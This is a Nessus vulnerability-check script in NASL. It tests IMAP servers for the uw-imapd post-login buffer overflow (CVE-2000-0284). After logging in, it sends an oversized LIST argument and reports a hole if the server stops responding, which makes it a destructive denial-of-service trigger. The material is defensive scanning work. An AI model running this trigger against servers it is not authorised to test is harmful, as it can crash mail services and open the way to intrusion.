#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10374);
 script_version ("$Revision: 1.17 $");

 script_cve_id("CVE-2000-0284");
 script_bugtraq_id(1110);
 script_xref(name:"OSVDB", value:"12037");
 
 name["english"] = "uw-imap buffer overflow after logon";
 name["francais"] = "dépassement de buffer dans uw-imapd après le logon";
 
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
There is a buffer overflow in the remote imap server 
which allows an authenticated user to obtain a remote
shell.

Solution : upgrade your imap server or use another one
Risk factor : High";

 desc["francais"] = "
Il y a un dépassement de buffer dans le serveur imap
distant qui permet à un utilisateur authentifié d'obtenir
un shell.

Solution : mettez à jour votre serveur IMAP ou changez-le
Facteur de risque : Sérieux";

 script_description(english:desc["english"],
 		    francais:desc["francais"]);
 
 summary["english"] = "checks for a buffer overflow in imapd";
 summary["francais"] = "vérifie la présence d'un dépassement de buffer dans imapd";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 
 family["english"] = "Gain a shell remotely";
 family["francais"] = "Obtenir un shell à distance";
 script_family(english:family["english"],
	       francais:family["francais"]); 
 script_dependencie("find_service.nes", "logins.nasl");
 script_require_ports("Services/imap", 143);
 script_exclude_keys("imap/false_imap");
 script_require_keys("imap/login", "imap/password");
 exit(0);
}

acct = get_kb_item("imap/login");
pass = get_kb_item("imap/password");

if((acct == "")||(pass == ""))exit(0);
port = get_kb_item("Services/imap");
if(!port)port = 143;

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 b = recv_line(socket:soc, length:1024);
 if(!strlen(b)){
 	close(soc);
	exit(0);
	}
 s1 = string("1 login ", acct, " ", pass, "\r\n");	
 send(socket:soc, data:s1);
 b = recv_line(socket:soc, length:1024);
 
 s2 = string("1 list ", raw_string(0x22, 0x22), " ", crap(4096), "\r\n");
 send(socket:soc, data:s2);
 c = recv_line(socket:soc, length:1024);
 if(strlen(c) == 0)security_hole(port);
 close(soc);
}

